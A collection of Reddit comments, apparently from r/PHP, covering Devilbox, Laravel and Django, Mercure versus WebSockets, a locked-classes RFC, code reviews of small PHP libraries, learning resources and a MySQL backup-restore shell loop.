Ah, right - I have that mapped to an alternate button on my trackball. 
TIL, thanks
Pragmatic, but not nearly as fun.
I learned how to write list and dictionary comprehensions a couple days ago and I'm not sure of the reason why, but I'm pretty excited about it. Being able express this PHP: $collection = [/* ... */]; foreach ($collection as $key =&gt; $value) { $return[] = arbitrary_function($key, $value); } ... in one line with this equivalent code in Python: collection = {} results = {key : arbitrary_function(key, value) for (key, value) in collection} That's really nice to me. I like Flask, but I'm not a huge fan of Python for web development and will most likely stick with PHP. Perhaps that's just because I'm much more familiar with PHP than I am with Python but it is what it is. For now, at least -- who knows how I'll feel once I complete this Flask project.
It works for everything else too though. Opening tool windows, committing, whatever, virtually every button you click in the IDE that has a keyboard shortcut, it'll tell you what it is. IIRC for things that don't have a short cut but could, it'll also give you a "You keep doing that, do you want to assign one?" message. I used it for a while, it was nice, after a certain point though you know what you do and don't want to do with shortcuts and it's just kind of annoying.
Is devil box fast enough for Magento development on Mac OS? I understand there are issues with virtual machines and synced folders/files on Mac OS, and add to the fact Magento is a beast, a fast docker setup is a must. What are the read/write speeds, compared to native speeds? Also, does devilbox provide an easy way to interact with the PHP container, say, for running composer or bin/magento?
Great work. Looking forward to using v1.0
From my experience, Magento 1.9 runs quite slow, and I can only imagine 2.x is slower. It’s quite easy to get into the PHP container, there’s a handy shell script (./shell.sh I think) 
&gt; Is devil box fast enough for Magento development on Mac OS? Out of the box, not on MacOS, there's however already a working version for `docker-sync`, which has not been added/documented, but in the issues are working examples: https://github.com/cytopia/devilbox/issues/105 &gt; Also, does devilbox provide an easy way to interact with the PHP container, say, for running composer or bin/magento? Yes, you're even encouraged to work inside the PHP container and use the available tools: https://devilbox.readthedocs.io/en/latest/readings/available-tools.html
I put on in so when I type `pre` it outputs this: echo '&lt;pre&gt;' . __FILE__ . ':' . __LINE__; print_r(); echo '&lt;/pre&gt;'; die(); Handy if I don't need to fire up xdebug for some basic debugging. 
Excellent, thank for the info. Possibly off topic, but is there a way to have multiple local projects running, but with different PHP requirements?
How about no
Actually yes, there's already one proof of concept here: https://github.com/cytopia/devilbox/issues/146
They should remove 'goto' really, or at least deprecate it. The only use case for 'goto' in PHP, is to use it as an example of how bad code can be written, a lesson of how NOT to write your code like this. 
Except that PHP is actually lightning fast compared with it's competitors. Take a looks: [https://benchmarksgame-team.pages.debian.net/benchmarksgame/faster/php.html](https://benchmarksgame-team.pages.debian.net/benchmarksgame/faster/php.html)
Not true at all. There are plenty of situations where using goto can produce much cleaner code. My favourite is in parsers.
Lacking documentation (see: php.net/swoole. No examples, no user notes). Many of the tutorials on the net are just copy/pasted from swoole.co.uk. Many of the Swoole usage examples and GitHub repositories you find on the net, need a run through Google Translate unless your first or second language is mandarin. If you want to use Swoole primarily for the performance gained by using PHP as an application server, spiral/roadrunner might be a better and simpler choice for you.
I'll take `opcache.validate_timestamps` for a thousand, Alex.
To reply to the original comment: the whole point is that it's not websockets based since they are deprecated (no longer supported with HTTP/2) - provided you are not talking of server to server websockets
I'm going to be working on something similar for a client's website soon. Not for Memberclicks, but with Oauth. Basically you want to follow the flow outlined in [this document](https://help.memberclicks.com/hc/en-us/articles/230536287-API-Authorization): You'll send the user to log in at Memberclicks and they will be redirected to your site. You make a request with the authorization code they send in the query string of your URI and if it's valid you'll get an access token. With the access token you can [get the logged in user's data](https://help.memberclicks.com/hc/en-us/articles/230536367-API-Resources-Profiles) and make an account for them if they don't have one, then log them into it. How you want to handle the "bridge" to WordPress's log in functionality is up to you; a very basic solution might be to create an intermediary table that maps a Memberclicks account to a WordPress account and store the password that you generate for the WordPress account in there. (This isn't the most secure thing and you probably shouldn't use it in production but it should give you a start.)
thanks, I hate it.
Parks, thank you for your comment. I appreciate the time you took to post that. I did not know of the plugin so that may be the answer. As for MC API, In full transparency, I’m quite novice to this and quite overwhelmed with those examples and instructions. Is this a project of interest to you? If so, I’d love to discuss it with you and review what I’m trying to achieve. Please shoot me a pm if interested. And, thank you again for the detailed response. I will see what I come up with!
Frankly, I don't see why that really matters. Your main traffic will be http2, but only the one-off requests to do a WS upgrade will be http1. It's trivial to set up your reverse proxy to terminate TLS and handle WS on port 443. What are the actual, tangible advantages? I really don't see any at all right now.
Because it had to stop for a Windows update along the way.
St Patrick’s Day is 17th March Source: I’m Irish 
Symfony does it pretty nicely. Current: https://symfony.com/blog/new-in-symfony-3-2-runtime-environment-variables Pre 3.2: https://symfony.com/doc/3.1/configuration/external_parameters.html
It's called Hiraeth
Not PhpStorm, but just wanted to say that the equivalent shortcut for this exact function in Sublime Text (Ctrl+Shift+M) is one of my most well used daily shortcuts.
why do you need to implement it ? PHP function are actually underlying c++ code, if you need to implement it, just go to php core and copy c++ code there &amp;#x200B;
Obvious troll is obvious, but I'll bite. You haven't violated any TDD paradigms - but you have violated multiple testing paradigms. &amp;#x200B; Ideally, testing code should not be coupled to the system under test (SUT), but you've gone one better - you've actually coupled the SUT to the test (the use of debugBacktrace). You're also introducing randomness into a test instead of having known inputs and outputs. &amp;#x200B; Also, if you wanted to test a unit that relies on random number generator, then you should inject a stubbed out generator with the same interface as the random number generator so you can control it's behaviour.
&gt; why do you need to implement it ? i don't need to, but i could probably learn something from doing so. also &gt; i need to do X. PHP has a dedicated function to do X, C++ does not. sigh happened several times. &gt; PHP function are actually underlying c++ code, if you need to implement it, just go to php core and copy c++ code there no, it's C code, not C++ code. for example, check the php explode function: line 1077 @ https://github.com/php/php-src/blob/879cd0491399ccfacac0d6ed701d998a65a6cc97/ext/standard/string.c#L1077 - does that look like c++ to you? 
&gt; Source: I’m Irish Cross-checked with ddg and this seems legit. My bad.
* It doesn't work on Windows. * Its usage is niche. &amp;#x200B; &amp;#x200B;
It is when we work with Javascript on tandem. * Javascript: Hey single-thread php, call the pdo routine and wake me when you are ready. * Javascript: And DOM, show this waiting.gif * DOM: Ok. * PHP: roger that. * PHP: PDO do you best....⌛... and we are ready, Javascript, it is the result. * Javascript: Nice, DOM, hide the waiting.gif * DOM: ok. &amp;#x200B;
* security : different instances. * performance (and costs): same instance. &amp;#x200B; &amp;#x200B; &amp;#x200B;
Yes, Upsource can do all this; it's basically a headless copy of IntelliJ IDEA. And if you are using Upsource, then that's obviously an easier solution. :) However, my team evaluated Upsource and didn't care for it as a code review tool, so non-Upsource alternatives are welcome. (Of course, you can also just run Psalm or other similar CLI tool.)
One windows update for every website request sounds about right. Take a +1 hahaha.
I use Devilbox almost daily great work!
I'm not going to criticise your style of programming so please don't criticise mine.
Why not just pay the $100 for Nova?
Maybe some folks don't want to use vue.js. if I recall correctly Nova uses it for all of the frontend.
People who are working with a low budget or none at all probably don't want to spend $100 on something if there's a free alternative.
Not bad for first learning project
&gt; Is devil box fast enough for Magento development on Mac OS? As promised to prioritize work on `docker-sync`, there is now a PR open (based on v1.0.0) that has docker-sync support and thus gives great performance improvements on MacOS/Windows: https://github.com/cytopia/devilbox/pull/535
This post was removed because you have a new account and we get a lot of spam from newly created accounts. If you have any questions or think your post should be reinstated, please send a message to the mods. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/PHP) if you have any questions or concerns.*
Ask Question 0 when i try include with ../ at that time this error showing me. Warning: session_destroy(): Trying to destroy uninitialized session in D:\xampp\htdocs\PHP\MyBlog\lib\Session.php on line 27 Admin login file location MyBlog/admin/inc/header.php &lt;?php include '../lib/Session.php'; Session::checkSession(); if (isset($_GET['action']) &amp;&amp; $_GET['action'] == "logout"){ Session::destroy(); } ?&gt; &lt;li&gt;&lt;a href="?action=logout"&gt;Logout&lt;/a&gt;&lt;/li&gt; My Session File location MyBlog/lib/Session.php &lt;?php class Session{ public static function init(){ session_start(); } public static function set($key, $val){ $_SESSION['$key'] = $val; } public static function get($key){ if(isset($_SESSION['$key'])){ return $_SESSION['$key']; } else{ return false; } } public static function checkSession(){ self::init(); if(self::get("login")==false){ self::destroy(); header("Locaton:login.php"); } } public static function destroy(){ session_destroy(); header("Locaton:login.php"); } } ?&gt; Then i also try this : &lt;?php // include ($_SERVER['DOCUMENT_ROOT'].'/lib/Session.php'); //include "../../lib/Session.php"; include "/lib/Session.php"; Session::checkSession(); ?&gt; Then its showing this kind of error: Warning: include(/lib/Session.php): failed to open stream: No such file or directory in D:\xampp\htdocs\PHP\MyBlog\admin\inc\header.php on line 4
Why not pay 49 euros for Backpack?
If you are looking to quickly migrate those mysql backups into the new version this should get the job done. Run this in your devilbox shell. It should restore everything except for the 'mysql' db. Make sure you have your data backed up, use at your own risk, don't blame me if something goes wrong ;) for F in `find /shared/backups/mysql -type f -name "*.sql.gz" ! -name "*mysql.sql.gz"`; do dbname=`echo $F | grep -oP "(?&lt;=__)(.*)(?=\.sql\.gz)"`; mysql -u root -h mysql -e "CREATE DATABASE $dbname;"; zcat $F | mysql -u root -h mysql $dbname; done 
Just increase upload max setting https://stackoverflow.com/questions/2184513/change-the-maximum-upload-file-size
[removed]
If you have an existing system for which migrating away from WebSockets is a pain sure why bother. However otherwise I don't quite see the point of sticking to websockets when they are clearly deprecated given that the HTTP/2 solution is quite easy to work on with Mercure (otherwise it's a bit more work if you are working with SSE directly) which also has the advantage of being language agnostic.
Websockets are also language agnostic, not sure I get your point. But again, what actually makes it better? The fact that it's "deprecated" really doesn't mean anything. I highly doubt browsers that currently support websockets will at some point drop support, that would just make everyone mad. Also, I don't really love the idea of bringing in an additional service (Mercure server) when I can just have everything integrated in my codebase (using Ratchet in PHP for example). Mercure needs to do a lot more to sell me on it, because I still haven't seen any tangible advantages.
I'm really not following you: so far your argument is "Mercure doesn't have any tangible advantages". The question could be the other way: what does websockets have bringing tangible advantages? None. For one you need to install Mercure, for the other you need to have a reverse proxy for WS. As I said before, if you are relying on some specific tooling or codebase, sure it doesn't make much sense to migrate at this point. But I just really don't see a reason to stick to an HTTP/1 only tech otherwise.
This post was removed because you have a new account and we get a lot of spam from newly created accounts. If you have any questions or think your post should be reinstated, please send a message to the mods. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/PHP) if you have any questions or concerns.*
Well you don't need a reverse proxy for WS, that's just to smooth out the experience. Not a requirement, just a nice-to-have. Sorry if I wasn't clear there. I hope someone comes up with a Ratchet-like PHP implementation of Mercure, that'd be interesting to me.
You seem very lost and I don’t just mean as far as Reddit goes
&gt;I hope someone comes up with a Ratchet-like PHP implementation of Mercure, that'd be interesting to me. Wouldn't that be the Symfony Mercure component?
Euh,I don’t think that the user’s display has a thing to do with the image he is uploading. I supose you know that to, so what are you asking?
Does Laracasts have any on OOP? 
My understanding was that it was just a component to connect with the Go Mercure server, not an actual Mercure server implementation in of itself... unless I'm mistaken.
Learn the basics of OOP then pick up a framework, I suggest Laravel. 
https://laracasts.com/series/object-oriented-bootcamp-in-php
If I’m remembering correctly, tutsplus has some good beginner OOP tutorials. 
Thanks a lot. I will try this. 
I have plan to learn Laravel after a good understanding on OOP. 
I have just seen some useful tutorials on tutsplus. Thank you..
Lynda is great but its paid. Laracast is great as well but also paid jsuk. Books id recommend is The self taught programmer the examples are in Python but that book helped me understand OOP and I actually first learned OOP in Python I wrote Hangman is functional and then re created it in OOP. But thats just me so figure out what works for you. 
Xdebug should be a part of every php developers tool set. 
lost me at \`Never use the -m &lt;msg&gt;\`
Looks pretty cool. There are always going to be naysayers out there. If it benefits you and helps you grow as a programmer then go for it. would anyone actually use it? maybe not but who cares.
A 3 minute review - Some tests wouldn't go amiss - Indentation seems off for me, everything indented by 1 - You mention requiring 7.1 in composer.json but do not leverage things like short array syntax, scalar returns, void types etc. - Could leverage consts for states: https://github.com/davidbehler/timer/blob/master/src/DavidBehler/Timer/Timer.php#L25 or even better a state machine. Might be overkill for this however - Redundant else: https://github.com/davidbehler/timer/blob/master/src/DavidBehler/Timer/Timer.php#L27 - exception is thrown above, could reduce indentation. - https://github.com/davidbehler/timer/blob/master/src/DavidBehler/Timer/Timer.php#L69 - Would advise keeping the "happy" path out of the nested scope, flip the if condition and throw in there. Reduces nesting. 
Most important thing, use type hints, return types and strict typing. &amp;#x200B; [**timer**](https://github.com/davidbehler/timer)/[src](https://github.com/davidbehler/timer/tree/master/src)/[DavidBehler](https://github.com/davidbehler/timer/tree/master/src/DavidBehler)/[Timer](https://github.com/davidbehler/timer/tree/master/src/DavidBehler/Timer)/[TimerInterval](https://github.com/davidbehler/timer/tree/master/src/DavidBehler/Timer/TimerInterval)/**DateTime.php** Use DateTimeImmutable instead of DateTime &amp;#x200B; [**timer**](https://github.com/davidbehler/timer)/[src](https://github.com/davidbehler/timer/tree/master/src)/[DavidBehler](https://github.com/davidbehler/timer/tree/master/src/DavidBehler)/[Timer](https://github.com/davidbehler/timer/tree/master/src/DavidBehler/Timer)/**Timer.php::25** &amp;#x200B; `if (...) {` `throw Exception` `} else {` `...` `}` &amp;#x200B; Easier to read: &amp;#x200B; `if (...) {` `throw Exception` `}` &amp;#x200B; `...` &amp;#x200B; &amp;#x200B; &amp;#x200B; &amp;#x200B; &amp;#x200B;
phptherightway.com (seriously) and read OWASP about web security.
I'd never pair up Laravel with Vue coupled together, just use Django as your rest api and make the front-end consume an authentication token (JWT). Laravel is great but you're already using Django which is a better choice, why would want you learn Laravel?
I'd also like to add: Laravel abstracts everything, I also do hate PHP but Laravel is the only reason I'm using it
Hi r/PHP OP Here, &amp;#x200B; For those of you who are following my project, I have an exciting update for you Rubix ML 0.0.10-beta introduces 4 new learners (2 Supervised, and 2 Unsupervised) among the 40+ choices already available ... &amp;#x200B; [LODA](https://github.com/RubixML/RubixML#loda) \- *Lightweight Online Detector of Anomalies* is a newer anomaly detection algorithm that uses an ensemble of histograms for density estimation. [Radius Neighbors](https://github.com/RubixML/RubixML#radius-neighbors) Classifier and Regressor - These both use the new Ball Tree implementation which accelerates radius queries by around 30X. [K-d LOF](https://github.com/RubixML/RubixML#k-d-lof) \- This is a k-d tree accelerated version of [Local Outlier Factor](https://github.com/RubixML/RubixML#local-outlier-factor) anomaly detector. &amp;#x200B; In addition, we've also accelerated [DBSCAN](https://github.com/RubixML/RubixML#dbscan) using the new base Ball Tree implementation. &amp;#x200B; Feel free to ask any questions about the library, I'll be happy to help
Can I ask why you would never couple them together? I wanted to learn it to be more well rounded and also to stay competitive. Why do you personally think Django is the better choice? I really enjoy it, but always consider alternatives. 
Also, how tmdi the ORMs compare? 
Nobody can beat Jeffrey Way at teaching and his beginner course is free [https://laracasts.com/series/php-for-beginners](https://laracasts.com/series/php-for-beginners)
Easy Links: * [PHP: The Right Way](https://phptherightway.com) * [OWASP](https://www.owasp.org/index.php/Category:PHP)
Vue.js is way too overkill for Laravel, JS + Web Components will do perfectly, I'd only use Vue (or whatever SPA framework) decoupled from the actual server so the project becomes more maintainable. Django (Python) has more use cases and power apart from just web development, allowing you to make complex platforms (SaaS, PaaS, etc). Although expanding your knowledge is always good, I'd pick something different in your case (GoLang, Angular, TypeScript, Node.js, Dart, insert cool new tech here).
[PHP Pandas](https://daylerees.com/php-pandas/) by Dayle Rees. Unfortunately it wasn’t written yet when I was learning but I’ve flipped through it and it looks great. Dayle has a friendly writing style that I enjoy. And it’s free to read online :)
Vue isn't just a SPA framework. You can use it to encapsulate presentation logic as an extension to HTML in the form of components. 
Just to close the loop on this one: I updated the `README.md`, `setting.md`, and `identifying.md` to better explain our value proposition, the environment file load order, and our decisions around identifiers with [PR#50](https://github.com/jstewmc/gravity/pull/50). I also verified that anonymous function definitions don't have access to the manager's private methods with [Issue#50](https://github.com/jstewmc/gravity/issues/49). Thanks a bunch for your feedback!
I'm not why you say Vue is overkill but then suggest Angular. Also, doesn't laravel support Vue out of the box? 
Lmao Windows 
https://wiki.php.net/rfc/locked-classes Rowan Collins presents an RFC that would prevent an object from having properties dynamically assigned to it, and would instead require them to be defined as properties at compile time. This would introduce a new "locked" keyword so that individual classes could opt into it. As I like my programming languages like I like my dommes (rather strict), this gets a big +1 from me. 
I think I like this. It provides for language level features for enforcing additional strictness, and I like strictness. While it's certainly possible to emulate most of this functionality using a __set method, I think exposing it as a core function allows it to be explicit in its intent, and more to the point, the internals team will be responsible for handling any unusual edge cases. The main thing which comes to mind for me is "is a keyword necessary?" If it were instead added as an interface, it could easily be (sort of) polyfilled (or at least made non-compile-errorable) in earlier versions; composer could define it as a dependency for any version less than whatever version this ends in. class MyClass implements \PHP\Sealed { ... }
Unfortunately you can only really answer this question by trying to build something with Laravel and seeing if you like it. If you have a basic grasp on PHP and previous experience with other languages, the Laravel documentation and Laracasts will give you enough pointers to build a basic API over a couple of days. See whether you enjoy it more than you do working through basic PHP tutorials and if you do, study the language itself as you build something that is useful to you. As you learn more about both the language and framework you'll probably want to go back and refactor things, but that's all part of leaning. Personally I prefer both Laravel and Symfony to my (relatively minor) experience with Django, but it's very difficult to properly understand what someone else does and doesn't like about programming languages. Finally, Laravel does come with some bits of scaffolding to get started with Vue (and React), but it really doesn't matter too much what framework you're using. At the end of the day, Vue is still just consuming your API.
I agree, not a big fan of adding keywords for minor features like this.
Best bet is symfonycasts. The videos are paid (reasonable price, imo) but the transcript is free
Start with a beginners php book 
Why don’t you do it yourself?
Lmao. Professional who always picks the tools available to him and has no corporate requirements
do you want do it thats the question :D
Inb4 you offer to pay with Instagram exposure.
I know right? Compatible with almost everything out there... And now with hyper-v so you can run a Linux VM essentially on the bare metal right next to windows while windows is still running. PowerShell with Linux subsystem and then of course the ridiculous PS commands that return objects instead of raw text that you have to scrape with grep and regex...
 I discovered this admin template called, Stisla ([https://getstisla.com/](https://getstisla.com/)) I haven't tried something so huge like this before, after I downloaded the depencies, it grew in size up to 200+mb, just for a template :3 I am also trying to use this with symfony ang angularjs, though I am having trouble as how I would set the directories, where to create or put new pages, and mainly, HOW TO CUSTOMIZE the pages together with symfony and angularjs. It contains a lot of javascripts and css, looking at it makes me frustrated. It would truly help if someone could provide me a workflow? or what steps should I take.
I think you can find many Youtube guides for the same for free!
I'm against this; It seems to be solving a problem that doesn't exist. 
Thanks alot! This is valuable feedback! The indentation thing is weird though, should be tabs...and plenty of them. I‘ll take a look.
Hey, w00dy73, just a quick heads-up: **alot** is actually spelled **a lot**. You can remember it by **it is one lot, 'a lot'**. Have a nice day! ^^^^The ^^^^parent ^^^^commenter ^^^^can ^^^^reply ^^^^with ^^^^'delete' ^^^^to ^^^^delete ^^^^this ^^^^comment.
delete
DateTimeImmutable is a great idea, did not think of that! Thanks!
Work on one thing at a time and pull in the needed css / is files for it instead of loading the whole thing.
Read what I said, I rather use JS + Web Components, you don't need a framework for everything
I'm torn. Nowadays with static analyzers it's possible to prevent them. Bugs just happen, have seen those myself.
When working with classes that don't implement magic setters, this would allow for errors be thrown when attempting to set an undefined attribute. (e.g. setting `$image-&gt;colour` when it should be `$image-&gt;color` could be discovered immediately).
Even if it's nice, it's not PHP's job to check for typos. For unsimilar properties, one would probably argue immutability. The goal of immutability is to 'protect *my object*'. Who cares if someone takes a risk, adds a property to an object as long as they can't mess up '*my object*'
I don't like the idea of introducing a new keyword for a class definition (to always write `locked class` is meh, and I want all my classes to be locked). But the interface solution feels bad as this would be a 'magic' core-interface with no methods, which would just denote not contract, but a... behaviour? I think its called a [marker interface](https://en.wikipedia.org/wiki/Marker_interface_pattern) and I prefer a proper keyword for that to be honest
**Marker interface pattern** The marker interface pattern is a design pattern in computer science, used with languages that provide run-time type information about objects. It provides a means to associate metadata with a class where the language does not have explicit support for such metadata. To use this pattern, a class implements a marker interface (also called tagging interface), and methods that interact with instances of that class test for the existence of the interface. Whereas a typical interface specifies functionality (in the form of method declarations) that an implementing class must support, a marker interface need not do so. *** ^[ [^PM](https://www.reddit.com/message/compose?to=kittens_from_space) ^| [^Exclude ^me](https://reddit.com/message/compose?to=WikiTextBot&amp;message=Excludeme&amp;subject=Excludeme) ^| [^Exclude ^from ^subreddit](https://np.reddit.com/r/PHP/about/banned) ^| [^FAQ ^/ ^Information](https://np.reddit.com/r/WikiTextBot/wiki/index) ^| [^Source](https://github.com/kittenswolf/WikiTextBot) ^] ^Downvote ^to ^remove ^| ^v0.28
do you mean angularjs or Angular? Because they are different things now. If its angularjs then I recommend using Angular instead of persisting with an old framework. If its Angular then I recommend not using such a heavy "template". Although this thing goes a bit beyond a simple template. It uses a lot of JS that probably won't be built for Angular. Its not hard to build css layouts yourself. And thats generally what I recommend. But if you are using Angular and really want a template then I recommend using a template built for Angular that will use the Angular wrappers around common libraries. Otherwise it will just be a massive pain in the arse to integrate. There are several open source bootstrap ones out there. And there are a number of Primeng ones that are really polished. And if you are willing to move to angular material there are a number of options there too, although I still recommend building it yourself.
Do the word *example* means something to you?
&gt; Even if it's nice, it's not PHP's job to check for typos. I have to disagree with this sentiment - IMO it is very much part of the job of the language to provide tools for the programmer to define their expected behaviour, and to emit an error when those expectations are broken. We're getting typed properties, for example, they don't really make properties more powerful, but they do allow the programmer to define their expected behaviour. It's all about the language offering ways to identify potential errors *before* they break something in a much more unexpected way. 
Yep, it's a marker interface. Personally I use these a fair chunk, for example when I am compiling my DI container, I scan the class hierarchy and automatically add anything which implements DIRegistered to the container with public exposure. I mean what it really calls for is... well, annotations, which is something I am especially torn upon, but would be ideal in this case.
Seems like a really bad name given there is already something called courier.
Great job ! I'm looking forward the multiple PHP versions at the same time in the v1.1 :)
seems verbose in comparison to PHPMailer
&gt; it is .. the job of the language to provide tools for the programmer to define their expected behaviour, and to emit an error when those expectations are broken. What expectations do locked classes enable? - "My properties are safe from tampering" ❌ - "My properties have valid values" ❌ - "No new properties will be added" ✓ What expectations do setters enable? - "My properties are safe from tampering" ✓ - "My properties have valid values" ✓ - "No new properties will be added" ❌ No, but who cares.
There's going to be competition with the new Symfony component. [https://speakerdeck.com/fabpot/2-new-symfony-components-httpclient-and-mime?slide=27](https://speakerdeck.com/fabpot/2-new-symfony-components-httpclient-and-mime?slide=27)
try /r/phphelp or stackoverflow. they are designed to give help whereas this forum is meant for discussing the language and its features. also your question does little to shed light on the problem - use code examples to show what youve tried doing to fix the problem. 
You didn't really give any reasons for disliking php so it's hard to say. 
[Courier IMAP Server](https://www.courier-mta.org/imap/), for those wondering. Though, I bet most people running IMAP servers nowadays have moved to Dovecot.
If you're using Laravel &amp; Blade, and want your text to appear in bold, simply change your curly brackets {{ $var }} to {!! $var !!} But, be careful - this can lead to other HTML getting included - such as embedded JavaScript. Ensure you aren't letting users of your app enter HTML to be included in your pages, unless you sanitise / strip out unwanted tags.
Thanks for sharing this. I hadn't seen this new component yet, and it is tackling a lot of the same issues that I found with the existing PHP email libraries. Most specifically that it was difficult to define an email separately from the delivery mechanism. Courier is built on a separate library that defines how the email objects are built, so there is always the possibility to move to a different standard if the community goes that route. I'll keep an eye on this project to see where it goes. For my team, being able to define a template that lived externally in a SaaS was also an important part of the domain model, and it doesn't look like the Mime component includes that yet.
The native mail driver somewhat scares me. I might be missing something, but from the looks of it your library is vulnerable to header injection attacks.
Thanks for the explanation. I actually made sure to check for other packages on GitHub and Packagist prior to sticking with the name. I was not aware of the IMAP server, though.
Please feel free to log an issue and we can discuss it.
I don't want to put in time when it is not needed. Just noting from what I suspect is the case by quickly looking at the code. Do you have protection in place against header injection?
I think you might be right. The native courier was built as an example and for testing general logic (the template support does almost nothing). I'll give it a look when I'm next at a computer.
It's a full mail suite not just an IMAP server [http://www.courier-mta.org/](http://www.courier-mta.org/)
Thx ^^ nice work
YouTube videos on php are rarely any good 
\&gt; Right now, this only supports an EXTREMELY limited subset of PHP. There is no support for dynamic anything. Arrays aren't supported. Neither Object properties nor methods are supported. And the only builtin functions that are supported are var\_dump and strlen. Before anyone gets too excited...
You crazy sob.
ur2k00l
I have a Laravel application that is returning the following error: I have a Laravel application that is returning the following error: ``` PHP Fatal error: Uncaught Error: Class 'Whoops\Util\Misc' not found in /home/vagrant/www/healthpro/vendor/filp/whoops/src/Whoops/Run.php:379 ``` 
I would that class properties can be declared readonly, and changing the value of these properties from the outside of class throw an error or an exception. `&lt;?php class MyFooClass { public read $propery = 'foo'; } $object = new MyFooClass(); echo $object-&gt;property; //foo $object-&gt;property = 'bar'; //error or exception ` 
Interesting 
I can vouch for SymfonyCasts. Their content is awesome!
Looks pretty nice. I've always liked how Laravel handles mail (when Mandrill changed their T's and C's in 2016 I was able to switch provider with just a few config changes on a Laravel project), and this seems similar in that regard. Can see myself using this for non-Laravel projects.
how does wordpress serve content for url's that dont exist. each post has a url that you can browse to, but there are no actual pages on the webserver.
It's called URL rewriting: [https://www.smashingmagazine.com/2011/11/introduction-to-url-rewriting/](https://www.smashingmagazine.com/2011/11/introduction-to-url-rewriting/)
This is very interesting. I hope it will gain traction and become usable in production.
It's so mad, it's brilliant.
1. From the docs: $timer = new Timer(true, 'microtime'); Replace literal text values with constants. Or create a `MicroTimer` class that inherits from a base `Timer`. 2. From `getDuration` I expect the output to be a numeric value. Formatting should not done here, perhaps let the calling code handle how the value is processed. 3. What functions adds the `TimerCollection` that would make me prefer it over storing them in an array in my own code? 4. Instead of passing arrays to the `TimerCollection` methods you might consider using the `...` operator for easier argument passing. 
In my opinion most settings should be maintainable though the application itself. Where they are stored is less important, in config files or database. Create a set of class constants and retrieve them in code where needed.
The reply from /u/cheap_glitch is a good start - the other half of the answer is URL Routing in PHP. You need the server URL Rewriting to remove the 'index.php' part from the requests, but the routing is what allows WordPress core itself to interpret different paths. In WordPress the routing is accomplished by something else it also calls rewrite rules. The server rewrite rules you have will be a short snippet, but WP internally uses its own rewrites to provide pretty URLs. These rules are added with `add_rewrite_rule` and can be viewed from the `wp-cli` tool by running `wp rewrite list`. For PHP, in general, though you shouldn't use this technique. It works well enough for WordPress core - but has some quirks specific to their world. More 'standard' solutions would be something like: * [nikic/FastRoute](https://github.com/nikic/FastRoute) * [thephpleague/route](https://github.com/thephpleague/route) * [symfony/routing](https://github.com/symfony/routing)
for your giant switch loop you should take advantage of switch optimizations in 7.2: https://derickrethans.nl/php7.2-switch.html They need to be integer/string literals though, constants don't work, even if they can be resolved at compile-time.
When you switch implementation, the code that sets up all dependencies also has to change because the setup is not standardized. A more extensive interface can prevent that. Construction is limited. Normally one for normal use and some additional for specific tests. (Sorry for the late response)
Please let me know what you think, I believe it will be useful to some people.
Yet it still amazes me how many devs don't use it and rely on var_dump
&gt; doesn't have built in horizontal scaling thats simple for everyone. Come on. Even if mysql's built-in replication is too complex for you, it is heaps better than this home-brewed PHP-based replication. Do yourself a favor, spend some time learning [mysql replication](https://dev.mysql.com/doc/refman/8.0/en/replication.html) and then simply ditch this piece of code. Really. No offence meant but your premises are beyond any reason. And the implementation is too questionable to survive. Some big problems are - incompatible syntax - flawed error reporting - [statefilness](https://phpdelusions.net/pdo/common_mistakes#statefulness) - awful memory consumption (all rows fetched unconditionally) - and many ,more - PDO::ERRMODE_SILENT 
I don't get your execute method. Why the check for the table? &amp;#x200B; And if it should be useful - use composer. And what's about your previous-versions folder? You have git... so use git.
Okay thanks I'll take a loot at replication but I'll see how far I can take this project.
It needs the table name so it can do a check on every table to see which has the lowest row count, and then it will find the lowest row count table and perform the query in that single table.
I just made an addition to my comment. You code seems being much more weird than it looked at first. 
I could instead just perform a COUNT() query, correct?
Yes you could, but given this is your production code and it works, your database server is not even near to the point where you would need any replication.
Yea, the example tables don't have millions of rows or anything but it's just to show some example data. I'll keep on making enhancements to it and hopefully someday have another way of replication sorta.
\[Hiring\] Admin php hacker \[User\] Use Windows to dev \[Me\] LMAO GTFO 
Bullshit
Bullshit
Ah... I see. So it's kind of virtualizing partitioned tables.
[https://www.youtube.com/watch?v=8q3MspafsnE&amp;t=592](https://www.youtube.com/watch?v=8q3MspafsnE&amp;t=592)
1. As there are no millions of rows, you had no reason to write this wrapper. 2. This code won't work when there will be millions of rows. 3. Millions of rows is nothing to a single mysql server, you need billions to start worrying about scaling. But you seem be rather deaf to any reason so I am leaving you alone. Have a nice day.
I appreciate the facts you're giving me, thank you! The reason I'm actually writing this library is because I'm working on a potentially huge website that uses MySQL databases, and if it were to ever need to scale I could easily use this library. I'll try my best to figure out ways of getting this library to work with millions, even billions of rows.
&gt; Next is the PDO (public data objects) connector ...wait, what?
As someone who just recently started learning C to be able to write PHP extensions, this excites me.
Dude I appreciate your quest of finding PHP related articles to share here. And about 50% of your submissions are good, which is incredibly high number already. but let's make it even better by filtering out stuff like this? Come on, 2 paragraphs that could be condensed into a single sentence called a tutorial? Really? 
I’ve met Ryan in person. He does an awesome job with the Symfonycasts tutorials
Some legacy codebases have caused me serious headache trying to debug with Xdebug. I love it but there are times when it's just easier to dump and die than it would be to use Xdebug. Still, I will say too many PHP developers don't use Xdebug at all and that's unfortunate.
This is a bit different than that--more along the lines of avoiding this: ``` &lt;?php class MyClass { public $property; } $a = new MyClass(); // note the typo: $a-&gt;porperty = 'abc'; ``` The above would still work find and throw no errors. Having a class locked would throw an error
How does this compare to Zephir? https://zephir-lang.com/en
The irony [https://imgur.com/a/uxzbnQf](https://imgur.com/a/uxzbnQf)
^(Hi, I'm a bot for linking direct images of albums with only 1 image) **https://i.imgur.com/ssq4Wjy.png** ^^[Source](https://github.com/AUTplayed/imguralbumbot) ^^| ^^[Why?](https://github.com/AUTplayed/imguralbumbot/blob/master/README.md) ^^| ^^[Creator](https://np.reddit.com/user/AUTplayed/) ^^| ^^[ignoreme](https://np.reddit.com/message/compose/?to=imguralbumbot&amp;subject=ignoreme&amp;message=ignoreme) 
Another attempt to pull a blogspam article from a throwaway account through a doorway to promote a paid error reporting tool. **Why don't you make a straight and honest introduction**, like "Show /r/PHP: Acme error reporting tool, it's paid but the price is reasonable. Also there is special bounty for Redditors"? But instead you write a shitty article on error reporting in 1999 and go at lengths trying to disguise your blogspam.
But they also want to sell their t-shirt!
